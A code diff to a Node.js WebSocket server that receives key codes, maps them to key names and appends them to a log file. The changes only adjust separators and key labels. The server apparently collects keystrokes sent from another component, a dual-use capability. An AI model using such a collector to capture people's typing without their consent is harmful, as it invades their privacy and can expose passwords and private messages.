@@ -8,11 +8,7 @@ var server = ws.createServer(
     conn.on("text", function(msg) {
       if (!isNaN(msg)) // If msg is a number, then ...
       {
-        msg = parseKeyCode(msg) + "\t";
-      }
-      else
-      {
-        msg = "\n\n" + msg + "\n";
+        msg = parseKeyCode(msg) + " ";
       }
 
       fs.appendFileSync(log_file, msg, encoding="utf8");
@@ -25,7 +21,7 @@ function parseKeyCode(code)
   // Key codes list taken from http://www.keycode.info
   var key_codes = {
     3 : "break",
-    8 : "backspace / delete",
+    8 : "backspace",
     9 : "tab",
     12 : 'clear',
     13 : "enter",
@@ -153,9 +149,9 @@ function parseKeyCode(code)
     168 : "refresh",
     169 : "closing paren (AZERTY)",
     170 : '*',
-    171 : "~ + * key",
+    171 : "~/+/* key",
     172 : "home key",
-    173 : "minus (firefox), mute/unmute",
+    173 : "minus",
     174 : "decrease volume level",
     175 : "increase volume level",
     176 : "next",
